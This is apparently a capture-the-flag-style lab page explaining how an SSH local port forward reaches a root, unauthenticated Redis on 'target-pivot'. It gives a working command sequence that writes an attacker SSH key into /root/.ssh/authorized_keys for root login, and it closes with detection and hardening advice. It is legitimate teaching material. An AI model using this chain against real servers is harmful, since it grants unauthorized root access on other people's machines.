# C07 · Station A — local forward (-L) → Redis as root · ★★★☆

> **Chapter:** [[Chapter-07-Overview]] · **Next:** [[C07-Station-B-remote-forward-updater]]
> **Host:** `hollow-relay-01` (`target-pivot`) · **Service:** Redis on `127.0.0.1:6379`, no auth, **root**
> **The bug:** a loopback root Redis + a local port forward to reach it.

---

## 1. Exploit — do this first

```bash
# attacker: pull the target's loopback Redis to your box
ssh -f -N -L 6379:127.0.0.1:6379 labuser1@target-pivot
ssh-keygen -t ed25519 -f ./k -N ''
printf '\n\n%s\n\n' "$(cat ./k.pub)" | redis-cli -h 127.0.0.1 -p 6379 -x set pwn
redis-cli -h 127.0.0.1 -p 6379 config set dir /root/.ssh
redis-cli -h 127.0.0.1 -p 6379 config set dbfilename authorized_keys
redis-cli -h 127.0.0.1 -p 6379 save
ssh -i ./k root@target-pivot 'id; cat /root/flag.txt'
```

---

## 2. How you find it

```bash
ss -tlnp                              # 127.0.0.1:6379 — loopback only
# after the -L tunnel is up:
redis-cli -h 127.0.0.1 -p 6379 ping   # PONG — you're on root's Redis
```

## 3. Why it works

`-L 6379:127.0.0.1:6379` makes your SSH client forward `attacker:6379` through
the session to `127.0.0.1:6379` **as seen from the target** — the loopback
Redis. Redis runs as root and `CONFIG SET dir`/`dbfilename` choose where `SAVE`
writes; a key's value becomes the file. Writing `/root/.ssh/authorized_keys`
with your key (padded by blank lines so sshd skips the RDB binary bytes) lets you
log in as root. An SSH key is high-entropy, so it survives the RDB encoding.

## 4. Pitfalls

- **Redis 7 "protected configs":** `CONFIG SET dir` is blocked unless
  `enable-protected-configs yes` is in the config — the lab opts in. Production
  Redis 7 defaults block the classic write.
- Pad the key with `\n\n…\n\n`; sshd ignores the RDB header/footer lines.

## 5. Detect & fix

- **Detect:** `ps -o user -C redis-server` (never root); `auditctl -w /root/.ssh/authorized_keys -p wa`.
- **Fix:** run Redis as the `redis` user, require auth, keep `protected-mode on`. [[Blue-Team-Playbook]].

## 6. What you learned

- Loopback ≠ safe; `-L` reaches it. A root service that writes files is a root file-write.

> Next: [[C07-Station-B-remote-forward-updater]] · Related: [[C03-Station-A-GTFOBins-sudo-find]]
